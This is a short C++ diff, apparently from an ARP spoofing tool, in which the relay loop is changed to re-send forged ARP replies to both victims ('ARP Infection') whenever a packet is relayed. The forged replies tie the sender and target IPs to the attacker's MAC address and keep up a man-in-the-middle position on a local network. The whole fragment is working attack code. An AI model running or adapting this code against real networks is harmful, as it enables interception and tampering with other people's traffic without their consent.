@@ -54,7 +54,17 @@ int main(int argc, char* argv[]) {
         spoof.SendPacket(pcap, p4, sizeof(packet));
 
         while (1) {
-            spoof.RelayPacket(pcap, attackerMac, attackerIP);
+            if (spoof.RelayPacket(pcap, attackerMac, attackerIP)) {
+                        //Send ARP Infection
+                spoof.SetPacket(packet, spoof.senderMac_, attackerMac, ArpHdr::Reply, spoof.targetIP_, spoof.senderMac_, spoof.senderIP_);
+                const u_char* p3= reinterpret_cast<const u_char*>(&packet);
+                spoof.SendPacket(pcap, p3, sizeof(packet));
+
+                //Target ARP Infection
+                spoof.SetPacket(packet, spoof.targetMac_, attackerMac, ArpHdr::Reply, spoof.senderIP_, spoof.targetMac_, spoof.targetIP_);
+                const u_char* p4= reinterpret_cast<const u_char*>(&packet);
+                spoof.SendPacket(pcap, p4, sizeof(packet));
+            }
         }
         
 
